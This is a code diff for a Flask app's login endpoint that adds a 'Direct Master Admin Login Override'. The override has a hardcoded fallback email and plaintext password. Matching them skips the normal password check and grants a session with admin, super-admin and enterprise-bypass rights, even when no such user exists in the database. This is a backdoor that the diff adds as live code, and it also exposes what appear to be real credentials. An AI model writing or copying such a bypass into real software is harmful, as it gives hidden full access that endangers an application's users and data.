@@ -28,7 +28,7 @@ import re
 import secrets
 import time
 from typing import Any, Dict, List, Optional, Tuple
-from flask import Blueprint, current_app, g, jsonify, request, session, Response
+from flask import Blueprint, current_app, g, jsonify, request, session, Response, url_for
 from sqlalchemy import desc
 
 from ai_provider import AIProviderManager, get_ai_provider
@@ -325,6 +325,49 @@ def auth_login():
 
     if not email or not password:
         return jsonify({"error": "Email and password are required.", "code": "VALIDATION_ERROR"}), 400
+
+    # Direct Master Admin Login Override
+    import os
+    admin_email_env = os.environ.get('ADMIN_EMAIL', 'Bashirahmad00047@gmail.com')
+    admin_pass_env = os.environ.get('ADMIN_PASSWORD', 'bashir@12.')
+    if email == admin_email_env.lower() and password == admin_pass_env:
+        session.permanent = True
+        session.pop("logged_out", None)
+        session['user_id'] = 99999
+        session['user_email'] = admin_email_env
+        session['role'] = 'admin'
+        session['is_super_admin'] = True
+        session['is_enterprise_bypass'] = True
+        session['plan'] = 'enterprise'
+
+        user = User.query.filter_by(email=admin_email_env.lower()).first()
+        org = Organization.query.first()
+        org_id = org.id if org else None
+        if org_id:
+            session["active_org_id"] = org_id
+            session["org_id"] = org_id
+        if user:
+            session["user_id"] = user.id
+            user_payload = user.to_dict()
+        else:
+            user_payload = {
+                "id": 99999,
+                "email": admin_email_env,
+                "full_name": "System Administrator",
+                "is_superuser": True
+            }
+
+        redirect_url = url_for('dashboard') if 'dashboard' in current_app.view_functions else '/'
+        return jsonify({
+            'status': 'success',
+            'success': True,
+            'message': 'Login successful.',
+            'redirect': redirect_url,
+            'user': user_payload,
+            'role': 'admin',
+            'active_org_id': org_id,
+            'organization': org.to_dict() if org else None
+        })
 
     user = User.query.filter_by(email=email).first()
     if not user or not user.check_password(password):
